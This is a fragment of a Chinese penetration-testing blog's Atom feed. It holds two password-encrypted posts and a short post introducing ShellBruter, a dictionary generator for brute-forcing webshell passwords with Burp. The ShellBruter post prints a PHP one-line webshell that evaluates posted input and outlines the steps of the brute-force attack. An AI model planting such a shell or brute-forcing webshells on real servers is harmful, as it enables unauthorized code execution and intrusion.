    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3eb3e9b5e848ad470c7847b253b803e1b52a31113781c8bd051e187b73bf0fed">a5c035cac555b5d84b40189f163d299485d2426daf76f5d717527c9819aab9d53c945bbbf7401f72e2d0405b27521554af47798fa71ad36dc71c69bf94567a19c48cb3acde1fe8628488f25e1c0252bfd3c67f21bae6d3d80289fb2686e5800a1108c5e8da5fd954b38e2ec65cec8c0525e9fda4d21991be3da60f51a005723e10484fc90551275312e0dd1d16525cca1d7045d10bcdc2724695f228aa5690da496bca88b086430dfdaf3c196cb605995602d35ff3ee341925245cf56dbc6fc9267124ae9459e23e42e76d4c809fc6cae6080f3aaefb1196e6f901f23a2c83f9a86eab27a2ca376a01e45fa22869cbf005117f0bd2c20128d48d642e0718cb7456abbe918ecacbbf00a62c13caf63eba6ad99e93ad18686fb11116e4ed72a345db1a667c10f2867f52f9df509d442fa1aaaa01b3eaec87a3002a373db3c252fa9f995e7f9d3ade86230087a47279859eb156875d304578dfbef1931d56eecb88d98e2b64302f8dbafe7ab55598d4567428faf8a55e32daf778ef0d06b7cd75a048128e70e3381e0bd6b9ed4196dfff22b8547343636bcbfd2e1670c768e877acd24ad7401594e08efda25bad2bbd97e406d4999905a640381ddf5159444c444d5d9eefa3e134df39790680dd0811d013907cd69667799f64c69c21aadee8bd67d11f15b99c1fcb5cb229d5b59621ed973d83661621fa6b513dafc3e36ed4445bd4ae193ec244bc1418c322c76d2fd8f0a70f24495bbb1f0b568a0de103b449b870f876783b7f1ad75aebc484de3064d2e07df2ed8a0d9439ab39f43e70414e953ff023108621fa15eaa723cf6670f1a71d9f69fa7d8c3b53ed414d67502db6a51d7665c6984bd2240e39337e9e7fdbc5607abddb892af082c5ee23874565a94a122e08e548be422e2ad78c7b8137c1e3908a8cccea2795a9d8a0c54eb013816793539d2016f3d070e8424f42755ef5837a7bcbe9f210616e905c359b3fc1528674a30c0cdd9ff0a0e04f4dfd92ec2af9b5c4d3a2e31cdee4d04987d1ab9d80543bc53e23d0d94e547f12810c231a2f3c2ad913beae5c4f968266bb611083f5de65e7faab4aa4f69f1d3cc33cc51a54a818cef54dd0da26c1cda669fda3c7ba2880515ac2badf58f0258318f28ba89408c165316ab19f6ea2d597a6c9f6d9984bded09d3ed373cc8dd290e886af03eec0f7caf1259beee932399da03b2a64ddb6c962c441003880680b8af18d7005f500bfc610f6b306b016b1299d5a61c1569421f91e71b904fb5345df5e7ccaac6bfef544f13eacb17e3870b2be6d2be4b75908f6aa59261e8281a5e55ce2a4168c0b0a5c82e1b888df31f09ebb13ae3a5d93036f19eb00d32b99e1e8b56e36409110015d742aa5a3ccc6b6ab85dbf928de4709169201be2f3fccb4518db5cbb391258c98dae245205182e06469d6d5e6417dfe9b510a08dee13a23c4985bb913be78064ba29ccbe6eaab3553ac87be7f9a27678ace173fcc5f3a97cfb8bead3298bfbac505281c5faf9acc3b637e5df444d908742cc987bdf1a9911be2bbb344dd0cd0d81063a14a0b20a1e49c0fd33b6f64bd813021d2649dd16146219c8309a2f9d060dcd850e3e31e22ce2ba6be55126f795fdfcd3e25efb58d58e4ce684c2aaa56a963bcd9a85ad0344c856d0a086587563a17dd893a429aad283598cf2462bbfed90d422e1a4edc0535eab0bb1ce951c3e820b152ff58d3c5ab82bf04b542029e33bcd144e1d9ea1f79ef1eca48d9a975ae4f6543b4bb96556f99933e3f6b0b92a2888f87f0a800578eff2205597f5417f5e86557c6b094eb941b7dd5bfe1636ce13c6060150edb92ce357db278baa0073e2eabd29cf7f479d36bd0c60971be90c3b32931badb9139d69ac910686ed30e1238171f13acbf42d97b5485830495704824f08a8b2eeff2ef7b9f5d7cb51390a66fb96260dd9cdc6592aa9ede80ac6eb2102878ccdf480f0aec1f7311c9e3fa77a83b4c0e9cfed26c119823776ff3bdf6fc899a9746f2af4a64b4a7fc6f80f158976d44dbf2ef0553d702f3e11305da4a81a2297389619621caefde94578fe17d8bf74ce16603fffc233250e15512d2c61b7cf9931bb54cc7905629cc8398e95483e37505f28fc3fe19fbfb5cbb874565d5de37b34d68f326ccf4482693d8d849c1390ff00719e2702548614e251b8791a10c31f458131196a1d98334d4e5b94d19c0775309044fbb444a180c181f64b770b5ee33766f56ecfa1a066eab2742eab31126ea11008a0d74a77e8655abdf64e8380c53dfbbbd5c8bae8583f0de3be99aa2cb5187aa0f8040df42b9b27562ccd05bb710c86a7e0ac9ea52053459109bf6f48a8f191b2df8d0d29cf3f86956a3133c8a32d8ff388387136e255fa10d43724b2616499741444a168e3d463f3620de20db59f7100c027611d6c8dddc7b2183ac9c9aa17ac88c7b90f823508766fec039ead67ccc630dcc1a9cb64cb4c1ea61e38c77364f623942107ea217733a83f8582c4377181403d3244cf5108dc2b24ca8f67dedc5ff4e1204767127e181ed8ab50a48ac14962950c586f43c8b5fb91b72b3973e253e4b17c542990d3700544078ab038462f09428aa2e1f916c8d8135b3e0e653d4000e2485dd351a41310aea7889b53ff8f53050798051eb145c2bc01d2691952be7a2fdcd7eb28bd4e7fbb7b109f770232dc8337763b7b141f47d38fd1f92d11cd69e59afde96a5312606c9b9df04c51d5346dbec87a885edeca0e3fe4feb134c3f22908213b25af5a5be2d8b137dc21aafec3ce3330d9544f1cb449f6045515f171ada9de1640a09129a24d7011b91113aff4a024bc26acb1270ee2288b17eaeade69d713fdd05ff11180b63caf08f55ff3a12c6b0302a1fde96304e70370161a9f31e5a043b7720c081bcbaf89be4b37ca945dbdfde98892f8b55611fde1a0c6735a3fef519dd8d4fc985e214acaa301a326670a888c4b3fa1d1d391ed100e37d8a9c71ae802fa694d9575967e34d162479045762cf02d1e91d65a92a918fdd8cfa0be7e0e4c0dc3d40734cf2d927b098a6a699124518ef3cb6945050b827c3e11195522ab45eaf54288e09c5558020baffaa3ab62c960c7852fd3706312b3d7d5fc5f549fae72ceeeb30dec613f22116e4d15d5b1383a0395f4eeaac3a8e73164a29ba68a80594e0abdd6c5552037fe115b5646e4da9476a3744e7c575d6ffc4d22519ef8c6087630ad324d78854d121942fb0701f8ed4f8905c94f543e3b0b4e829e783fc2e5e3f756cc4207d4859802963c8a14ee62d86669576831cec9ff367a9c70974c1b91fb4d249335c4e74c2a72af99596af0d961b3525ced4dfcc6390555a064d3abcde66145bdaac227ab81cbdf6e857a246ae63da60d462d956f6c06dbc040aeb7c040b74817d946334852b3e5d5458a31ef3136a4ec05ca1de1bf20e2e3675009c38060fc2306ebca4daa082f687d118a6d5d60f539becb02e5069f917ba8f4824c04fb989ba8c8ba9414c9bdb080e50fe6cfadb86e161170db94e2910a989be7a5b308d65881e53be700e0f828f196d7a531034df3411c0b22ff3646d1dd8bb7610ed6164b3ca4c785b79e8457b5f840ca1e877c996b9e8e482a3447dcbc0fc2294fb30aafec7800d8cd84d4fc06dfbb2ec7e3826f0c06fb6e861c371e65fe3f53f90735933283e843aeb0d06cf7d13554cfbae4be8b4421c31261be10cb283f91d525951724aed4c52ded0533c766b71b73e415901806088a2cd9c3d69063b1a0a376518c90db9538987cae38ecf2d731f35981dfa44311d2931e19ac0a1ad6a038a433ec86ccbceeb4f403d95fad072836070b20223bc45bfb011066ec023b6e6727874516ca2466f26fcf6f0bcb31d2b87c7e5161e82005bf3ca8e784d11e62926848967724f7ab3e547eb5eb701215c3f4fa32e8b8b1ef9b3627eae10d1190ebfd8d8188b57bd1de83244f641172b3d20eeeb8e1b7189c4cb402e21117779a630b7e0f0df0b5776baeeee6a44d2b3fbfce9ace9c4c4f725b20266d2d4ad1559942827176e0399403ca23d6ec8d4dc51d5b7525f8457c88e8db103d87e03bb39b69aeb5a11cdc109626eb952478b96d7d6203928b4a0d265932c98015099ce2c4ea689846497602729a6ea99fca0440b2d12517121b1faedd38470a3b3602d24f4092dacb63892975a9d9876b05186d2503c090a95e4bac3f9ab7fe07a27590eab83a9f876f1717c01f5843e3d24eb2a5dde796bafa93a54dc773edb88ec20e645526bb003660e2b571e9b278770b8dddb1d6cd7fe6033392a3751918f65102ca95ee43d23787d9b1c8efd881a5797c83961f24cdb4f0165cd8c3f4abcd63bd0649b883f7bfb7c24f5259d5974989d84a4503b6102342361fcf19ccd5dc210e9d2fa9ef05615697e87dcf0f7d698ba6a184a721b31df92c10cc16d3be87c8e01a8a2dc0c6d702b86f4065ec5bce5cede2163d39d8665a01dfc0f4699360aec0c667e9d6fb9d23eceb70f2f1b0f93eb46fb97e61d1b81c91821c1efde727e65f7ed7b7f709db96eef49f063b0fcddfb8d26f2dc65e17b503550b6f562f832f0be2595f869e6b8820e0923f7766645d441f8119ab3ddd6fafba4dffd9daa7a37b8c2c57742b2020c2a7c564fab4253702b138701317e9cb5a24723493a023518532d0a956053ec000bb628edd428abe3594bde57bce832fb7e74fd19dc24cba710bdc8900168460f8b0a8c1a6e081dda75ab2b2fbe9af8785a55356026f7514bc06d39a4778bb35b13d49528dd0338f04dd872efec574442e89392d5e3b5d54cc82c6e223138515fb17a38d9753148fc3a65e77edef6864046f4785926ba7cdd59933286dc2e6b931468acf1edfa93c78231703a10c5eff14c0087dd3a20138e26c8f394ae81afdcb9c641417b3ea0516f77de787178240979457d25892422e98d8396512ca0b4947ba8c39a138c43e7feabcd405b5e162906024843c12c9fb4656435027309b05b5454bf4bfd55806312ee7f54275622dd4da6164e46b584aca7abd78d130f98a8de15f76bfbfd5be047e5e4d13c1b566db2d9a1a1fb89490f8f5e934de1cb2b89ea4faae8f372d6e67eca336475791b813e337051dbb56791cb244fa0582bc2e9c1a5c403a0cb3ae5f1a74a585d9761d6dd0456a53cf12d5efe7e77a476af77641cc63d96f9ce78f9d481c2cf03513c255e03000587b028d224b510c32186c0fef97c4d7fa6b68fb5a4bd156cc32281968ad09b8da5cb7e979dab89ae46b62bef83dfc51398575a33c6a448c455710c41eafbd0574e3198bf67bd705b7fe8b1c1ec3f0f2fe841dff9bfaa8b0e0f9f9ce243198e58cba7be58fba9ab4bc34a955fd35bde5c5c29a1974b99fc2198bb9979ca85ea1120bd476d9053c86eea56f709fbb0dc07a015e526ab2eae00d9a286e81ed909e96deea9a122e3b8a2ed3d4fe13ee1f3306f4a10d39be0cdf918c14e08744ec3dec9bf16aeab2930871147172262c143e606145c2501fff8590221ce806139e9d10f7afebcf22f31bdb6d61da8c02f922148261dcd1ec29ea013798eb45259cc12fdafa9002c92d50e12ffe63ed45d7b22b7357ce06a1ba4ac4106dc010b0b0048bcd07306cbed76cf278cadecda0b5deda613614759ec3984513ede309d7b4ee1aa5bf3d047bacc44a0aeae33edf2da70b35f19d2cf6d81c6b5979a2b8009fad9d2da1e128be7af99eaf78849150044bdd62c9d74250e236a22e01666907cfd8b74d095deea905626536853063d3d1d75944e88dd2e5a8415323cd9682fef1426231a543854637598aa26ed1b33a7ee6bb8f0369234399871675a3397eca2b9a53685a19713790840763e2f4f9bb08eaeefe4205b72ee9c6ed826e75a5d3a0865e4ba164d62bc3095d1984bd0ab416e8781b6958041f97c03693b715d5bdb9d7e6510ab8653fd5b589eb7548f3f7bdbb9e5b41b51f634ceb534d7064d6b011ba03caf3ebfcfe94373ec9b59a655d3bdacee9d2dd26e30a8e64231a82d8655aa1b264d9ef2dd22c7c429953e2ee5e6ca5c28b74d0d3fe67c48a952453c1cbe5621eb4db8ad7e7897108f1f8c665426999c482aa8485a485aeb809bfa55024a0d0eff6052d0179f2e61bc4f3f5a49f8e8a94c827b8b84385a7346585e6b611f8a7ff14b5013c3687de151b2dfb22f5cdacb97aac6ab0f353f9ad6f128705250dbffaae014ec1adec558a2b02c440aa8651d72c3bfc9940d3f913addff45bf4b635d38d0b041b8742adf2454e80dbd0e66492bc738245688a5e089f1b93db516449b07bb78ec21a140de6f62f83119b4620c1c2885696762f83aaf4cbf45a9fdb918fa0a929c804d41eb719efcdc4421bb8b60b57fb450130257312e3f4e5006165b8747069849c50b02f5c73e093fcc3fb91abf773469dda6322dcc42ce4436f7e2be70b2ed9724610181fca8e2a2af8f9c03b6501344027c92092fe7114f6f02de94522003d537439340871361b3ffb8168621cd6d352716c212436b07fdfd164a53851678696c152a03121e9c2dd298878c92433aed881dbe42c8592772fe0039d1f1f117c2e92f059f26a0d925d79c4d258bc110ace2d95cd49fe05f50c8227776dde17518e7ff8f968e01469043942fcd6ed48215765cf151aa3336067dba3fe4ea41da24e106388a33c957933f61d5bd9e77a77fd62d20cce9ba03e860d0fc49996ab5aa96d0a6628721f28d67969581d7f9a3060182f5d159de1dee89c43eacf23360f91b38728f98d46e712e3284e51813ebe7abd8dc4c6a189cc4920bb57f69a13ce3bd97dc0d34881dce6fa746be91c0a784204a197520632a3db786da32da19b05093f9192226ed30a0e441e47e4d8b7592878c61e2e50948a5c0f17d0421b59f8140ba5ab8e270276ff14e0b409046b25dbd7c1a39b826eec903c4b072ac3b09c02584ce0e2b3d2424d441583d1c290a70d07b15b4fcb405bda5c9e18bd80f98d1237e48b59ad35ebf6ca87d651afda8998c96d986ae3af32f729bb45c0565d143be34df7096669ad73e35f4a0bc2bc3bec31b8e32627bc2882fa878d30ad4dfb5f1017f2bf42057b499b165d0c61a8c5a8fbaa95f248a63875371d8660c755c38acb5987880121f47d8daf50a4b4ab2e9c7d60191b0cf555b5aa445ed4a7858aee9c60d5d320b61fa5d494c7dcbf1f5aa32d791129b749c07d69a3137c47db10ad775b58c533561d04572571c9f482f5f88896c31383593624341574460f17933174a0813be615f29e503bc3770279f06fe8f17152911ff8b877e6d98fbc8326a8bbe05a0f49b1bd8bb4bc4e20b1be43d76b5af38fb4520da18bba349f85cb2fb7d6a298cc5568c5b7e370b4a782b0825abd0bbad3ee36f509f75038c00bca3babb8cf777918e3fc8730da85981c4b4eda44d3f25be8c2159453d4ab1a3672b46abff607c22131a003914b2815bdb510a4d20f67126602302f8e0b361bdae2bebac100d62a5e9e0e953518d52d7f0d72b7652a6a8caf5c6d33a673c52ebf866cca96e17e997d80f4ed64076c9f0c7c709e92b505989197963de7bfd6473cc8388e8ae04918606e41687689b4917bd12f8bab2b4bde79d16d7fd296cffab65bb951f3d38c89c061783b34c539b73a06c30691ffa3ee90f7da71ca1f965c30ed6a6801d12e6f3a6be6e8a6ed568a152005f9bd1acb45a2775711542c9b4d5b00d1cfe34f7a8dc754de293f8d99dfd436ebf80cf1a997f7d0848d66bd5c4e023235473c61f5c6b54be745d1962b45d9672aa3268bcf389d98f96a46275caa3101d6ad465412ca649aeeab570861d54a2c27f971abe6c811912f08ea7df7c54b00a6c2c1abf274e90090a7fb298efb5d03939c286e4b954dd1b629f47fcfaae567ce0e15cafbe6f5e6799e5a4c98588c9dfa60e5e512b7fce75d70c70b80388bed4879bd442219e347a7307025d50b0b374a83f4f88f8ce7559547c7e08b181cf5193e150359df9d1ab3430ccd84e7125fd4055d6c40f220a299cc3644d347fbd94c13aadd001c8671d101f29194405de79c0fc20cc80676a9b9e58f644052163d2d0c38c8e37802ca8166c938b279d8ef65c717438a01bd6756f20907201ccc0e469e843f601597fbd6e0ef86f1ddfc44d21d92b868032b25e01d9ee0e24da504cd2970c459abc0e9c180bcd7f2fa8cd0eeddb16652a3644c56074d88fca7f00de56b1bee46038a793971a469a3e274a0d0f223f3e302c33c9a673ed3ad0267d3b8c9456207497d190e953402167e8c3f14f7fbcbd89ebd29d75ddfcf6e463922f5a68f6b8a3645400506ee52f1fa7701817f690c7a15ac074b131aa503410189908cf41158b8e7eee1bf27a79a7fc85ff574237d64d09b075a76fb94a343a4174e5785d7523db82dbf9a69773f6b8f481d5e1ad581ffa8498f2766e0ff7b4fd575527d3b2021f11706f7e90747f1ec5771eaad3c05daa9230693267b7e8e85904973df5e302e68b2e9d7764576e9d14e95cf8c110a88607ae405eb1f1bc0a9c315c5ce89a6f4fbb8764d65a2077ebecf46ca55d2ece830e6b32350e69f9abb5e85a5baa6d67a9abb9d1c340ce4037a2aea17fe41e79049056a432e2b3ab771a8c10726964c081753a61b0194fd81d32062bb6cc07471ecb4d2a898f86ced8506cbd423c48058b83972e1026c943122c9329064e7888b6d19caa205436db7fd9618bb5c36f331c47a1d41b063f850782e7c92798b6ba94a29212f64e9fddaffda5bfd9f209117e3ecd49a8b17c347f4209286c1bf01c92723e44b403f2655111260606f646d765d07661866f45bdd19bba7581f2eef157e44883fe34bd7aa0c8dc5475d05d4358fed5df66cd1bfa0d284d8df2506c109218db06865b82703e9756a65203bc96f82c2c6d664be9942ceb4c22e9bf86f13cf2f2500b8878c6ef15bdb61923f9e35f45d7e742bfd32c2908fe12944b17a4575c867d58171057605ec2739173e6ec8930c5fb216422ad6f00c993637f69a0aa64c4cd510c18bc29dd85165c53c6ea01c4e3fffa3cdccec176b4b0cb9c76e1611ad0b5a07a5027521a75c74788c477f8bb7ee6b157d396fcba329c7c74430e1ab1aa1e3ddd513234a16b945195c291e3b0d5fbf0ec5563d2501335fabd747054e04c4e60c30c798a4881a3bdc44f11c278b54c9fb94e32d29c6a9e941a109bd879476492335b9636ed9a8048b07572ce87663107874fbaa10811a591e26ff2e2b0b6d0c08e5e7f4ae017b7f4a4d08a16fdd949c0c7cf51f3afc71862b1929463a146e742519aee4ed65168beb530c4f48bb1a8b005f78e9fa6d5427d592fee3927d7d027ec201ef6850e68480298352d56dafd32b338238fb3cdbcf47c36eb68757021eb8020e9a4cbb15b3c344c75f32095e7dcc4054713a0ef430b884e126a3e3889f58714481b4ca87f865afeee733c37cb6c1566d2829f1d5f72507f4dfc0e14227b6c2eff067a231311531d157d5baa49f6ab258e911b8716b2a9ddbb69cc1ce7966cdfdea8d81827bf9058d485a1794359fcb1328dcd036f5df442b9cce7b6eb9d9e770bccb649b06332af937f43e7ec7a6f070f4a50c03914a3295f272b50ae021a16b0d87ae1951333e875e3ec7537faa0824d392c3b4257fc4cc48714cf969d663feae0d58a0f1f337cc958298f433a3033a7070b3ada87c8f42a42d6c561a12b8a44ff941795f63efca7e9f7e081309648596ba2c6d2a8d2d08b8ceb8c459bcb2316b7f4b6254ddf37d70a554b41780458b7e9c8020f383b77118c541b24f12fcf6c4e0ba030066eb9d736f3f46f7f1236ac8f6f720738c08c297802588ba79fedb412237ea93d5a0291c9b23db24aa8052c778b63d18ac85ad95983ef8add72b254dbb81e90e7732471a5902321f02d71171cc79c02595ef0d9adeb6db06a50bd7f6b021616a14c0dc67aa045655aaa7c76b2103bb7503bb0f6d65519039e824f7855c7c7f28790cc630695bfc4a7fb17c743fe690128caede59898dfd873712442c5c25941acbd6b1a8d8be04e9cc895ca813443ed1eebb5d2a6c58f5ed78a049c0549365221ac284e883d274bf29ba01c949f3c5cf5207925e4606701bbba52ee155ab2fe91fecad97c10437a4bee1db0d17e444ff6098000fe2c8fcbdc526cde35e1254c7c265a40c94e4d14c1acb8bd46773665da825c4aa0d2c1f285b6863b6e66d7bf686e84543266a0d5c420e6b4e0a49e97ad9140ea0751aba72e07ac0458301c70a86d8bf4622fa2958ab3e53a1972b8377fe431c76c750fcb3ff10e56de4e7a40381dbe52d0b95ab81f23d1dc321cd77883cc89732206c8b258806f5787f55c30d4734e0c25555ab75ba3c343ed54d7d5dd23cbb19c0e72b2b2f5c5276dd38a379f206319a13717ff44da8149848dbe72cac7932db95919d95eeaebcc3524732233913924eeb07f0d35b0da91d30bba447952d796ce71868f77e5d86c56ca7ba0aa8f3a5e76e670aea6014d678717796ebec0ee94b1d19fefd864d769fcc813476dce0439dd4216807de93aebab8f83d0192b7387b93672f972e1c547c41365349d030bbd2cac44d5f3c659dcff0457234dca3c5c2fb5e091999e27fa3180bb2d4eb73741aef13202e526c2ec807ae5008adea38ab259cc59831b76f1655ec6fc2d47ae2930038101ec55c301c017b5dd73fa1cf7f45e007e1fa6c42d5d7c2067b8b8582f3a363a55971702f9e67d42</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>ShellBruter|WebShell高效爆破字典生成</title>
    <link href="https://www.se7ensec.cn/2020/03/22/ShellBruter/"/>
    <id>https://www.se7ensec.cn/2020/03/22/ShellBruter/</id>
    <published>2020-03-22T13:30:24.000Z</published>
    <updated>2020-11-14T19:59:43.480Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>江湖人称轮子妈。</p></blockquote><a id="more"></a><p>爆破思路参考：</p><p><a href="https://www.t00ls.net/thread-36985-1-1.html">https://www.t00ls.net/thread-36985-1-1.html</a> </p><p>这里不继续用python写请求的原因是感觉让burp处理这些会更好（懒）</p><p>使用示例：</p><p>假设当前shell为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[a]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1）burp加载生成的爆破字典</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/1.png"></p><p>2）关闭URL编码（很重要）</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/2.png"></p><p>3）得到结果</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/3.png"></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/4.png"></p><p>此方法可灵活使用，其余可自由发挥。</p><p>github地址：</p><p><a href="https://github.com/r00tSe7en/ShellBruter">https://github.com/r00tSe7en/ShellBruter</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;江湖人称轮子妈。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="暴力破解" scheme="https://www.se7ensec.cn/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    <category term="Python" scheme="https://www.se7ensec.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>一星期实战总结（二）</title>
    <link href="https://www.se7ensec.cn/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/"/>
    <id>https://www.se7ensec.cn/2020/02/24/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%932/</id>
    <published>2020-02-24T14:30:24.000Z</published>
    <updated>2020-11-17T15:22:56.679Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3e934de1af7c062d3dbab76ffdde74c24949249a83b7e6f23f9066a69e6228d2">f376b327ec9ddf8aacfd0f5a171ed67d407954dfe8ab6d9ffbe53c6d5fdb3d1b7f52d3d4cde99e102a996afe01bcef8e55c3ff1d4fe4461c3131b2c0f633a9c0cb66850aeff8ab5b57b56f71a5c81cf8944a4d2938779a23d9b42976566d501d29f638c6b29b7a5119f1340eb1d2c5dd034edd43cb76a68d589dd5acfe9e5b3d836ba211dd7bb1d1cb79f9711f34dd5c13c6e9cdbc58a14c8971ce30eadadfa29913470627f49a74d9c99fd6770a8768bc5c721567576b4f14704f2ce377a05612af82fade86f3d9ec5e7fb7676a1362c0540b2b255f68dc4247aaf582e4fb56bb14f5e42f3a7e0aabbaad389e6f51a47963d2efb7e6668cb60ab920a69883c020562b29b1adb9fc2528907534b673be603251e91a64f93bb87c9302cc1a94db553dee9016d1a11fb84e1abf46523f6dbbe8842e228988a9366f841894b7b0ba3cc59050c00919b599025c5e2bb82c19ea9eb0d3582bb8d41af52e30871a52a28f78710127650c56657d480bcfc4193bc8d201f4ce65fcab0008a9c709feece80a998957a8933ada37ca1b3c10f50aa4700ab0728143dff212e1d7683e60ab165488f4168eb488159d8c2baa9942a6e0a20bf5fc75759fc06716ae03cb8bb309b1515bb4874ca59ddc2fb76dabe242e2259750f91ca7448f1bf75c67dc9a469c985678d86e5888da3a474404f64cb9d16d5e21e481224f7ba6a9d041012bf362638e1fa08a25ce2154c36b0afe96a058f901618146de60d53de9e3b969229f75750dac4884ce04e9b2fb3d6f9d321bf90bf0858a3175dbfd7f31bc01eaaf99630c077904a24b999bc580d0775ef6af63e19a4c5e7587b0c85a3b4d91b737b69ecebf7a7a305f72dcaf0a68c37491c4e9c4c23f2722a1cd7ccf68131f98bc2aa05c926668a33a7b79fa86fd5fb29d41b6b878371d357ed92d2516fce823198fc91b7b65e41a5c544b805a1339ff1fc680774803f613992e5117c0edfaa07eba0134d229bfdc1af6d4afc0f2f9c2ab41222f2ee9f6e8d7913beb94ca6c147d1d7bf690e1b6eef822e52d6f5347bb925dd21fe1ae218ef90b232d6592158ae3499d38d1604f3bbcbeb040dd7218f6db40408e9e5fb764255e03aeb3919d0fc8928764514c1a91077aec384ff63cd1012dae0a3fdae91bddd02f10baa1644f252aca3724bdcb5b00af66f9599033787efbc33b8f9bd501ac786e5ce924a931207249a41e1b6a09c66c967de84f3760223de281d94db8342bd222b48952d8b89bc5ee14538ef09d2aae256a5072ea8806ea51deb59a7359a770b89423d679a0a6da96360d5f08eac0045124df3a3acde67261a318a31b47eda3ed9ff24110acadf7911f758a8b4277de5cdbe8db36c0725457a850d6273482e2d03ba425dab1c16186fc8bf25a033067289718b5b75aaad5ee4b0470128d9ea1deeb0610577a6adcb2eb266b1ac1acd33f1d39dfec553da11532253d8ef9890968bcfb7686ace231db8e9d47653fd281b0dda091517611f70700a342b6f8b00605d5f1324bcbb50438d60b034379f4bdeeabb110323331d3a161e8e342a4beb42518d63878545540e4fc670cf9cf4ad6d18c823cf6cf514d3bb929dee05054df6cc6de9c17517dbd6577914c05ffb4678544b3cef43d7fde23141afc082c607c84e8cb6a968817f2f6d02b507ddafc832a26f6513021c7cd2293ebeea465f440a33b2db4fe87ae67a9225ffee24430b9a4fbde6e9204489abe45055ec1fbb419c48f11dd2dc47a530fde0d564ef44e96d708fc7dffcc6c29deebc68dca431b934cd406d8740d3785fe203422e0355914433e2c310e1d7f1e961658ee1ea950ec1e1ac0aa809f6fc11af12ed82a950b554b2cb2525b5b310beb4ad925784b81da2657c60557a292bdf5242faf3bcaa37e5e5e1667d9e373b720e994fe77d4859e732d1e9f4118b3e0a2212378335f85768addb07751a453683155a1ceae7a690a8bba1aef046f797edab2a5cb15df8a98ac9e2d00ffa772ce456751a77799bf257f728463b6c1de739c97f4fe18c4c369c7513d86bd751bf8b4a501d53cca1312dc669126df33fe4ffa362aedc47d89d467d4993da92d8359de3e16c83060968607246a84448cae7fadd5a21c5bb988abe0e37fb2f181f87579db91be9fa45ba98fa867fe6e55906a25019cae6d7c3f6641aab2de9764a07ff413ece36ee54aa0b1269aafa9a25392748a8c02ee5129010abfe9870bc1c35bd8f5914a814a93ccff09994831d358e9ec7aee734e6bf40c9c17e43d39318361e3b713ee63af6bbad0d2fa6a5240cefcf26df0a2828eaf52d745b9e588f35f25a786dd00fdc4b34989b4fd996e2f53605bdc9f3fdbdd9a9292f7a7497f279d6d58e9e18d4819867206cdc527f5ccd15b011946a36668f86f9e6e9ed14a35a695cbc21ceac5eadfc89874f07bd737af193cf3d0fef18886108b97cc154673484ca47a08673693e618766d8bcf2f44a78287d40d57972ae255fb7ba2ff827ec6395b76df711cbff61a781a755251a103b640e156a932dadda13be4ed8ed7ca1b37f0c580aae3b3bb2d7049018bb03674f621be8a71f7bb0ec1ef628f4b57f5af3a516119558a099d76f8bd2acd341cf12b1d516f926b6e5a5605d9245ef6e6507ae52601ce74b34c7ff2f1fa75a14eceba5afd58c41444993e42707cdf05730d9ab7c5ea2a7f3f75a99ef3ed03d9800e9f7c30edd52ac1b273cfc83e1157ddbb330915e45f8b1e5ea022e40c4a2c22028ec634b172127909accd69a9b5241e572b57d021bf3d3d629efb236cbcfefd15226c4f2a2bae87f7d08051e3243d60ef8092a3950b555df9b4b61d477e5cd92baeadf087cd8d0cf82fc4102e9e53ede6a0c978fee2f538e9dcb220223edb9401ce9007473704740793cf180c8b8cfa40a7197b2c33ba8fca54f89564d5f1415cdd8bca2f52163173f54eb365459f8fb1463cb478ebf419a2d9d54d01798c5209cedec6114e43d36ee42ddd70f363485c1dd19988e9e7e74289d63b49d65a5b323866ed69b8b701c517aa9a90e74b92c30cd6e18636d2eba8312a63ea2938ad5d849d93e589877474035651402058d9e3ff8b58c1e0898cf25788fe42d87583f9dda763f3090c0d1b41ed873e832b938b567e07911ccfc960e45c0c69ebf4f1ea619e790e98efb5f51d9deab0b0ace68194a9d8fabaf9f290da4a9e48445880fd00528ea486516b195d28c757a9be81000a543b4cd449e1468be6d8887af3cc47c994d8b48eea5b844d942cb07528279865a13bbbe8d1a5e65bd332b45af2522ecfec9f75c55743237624a326956e5d56d2f3075517a4f4962acc371cfe1c0e7361eea932ec7fd61903df422f6cb638ee47b2453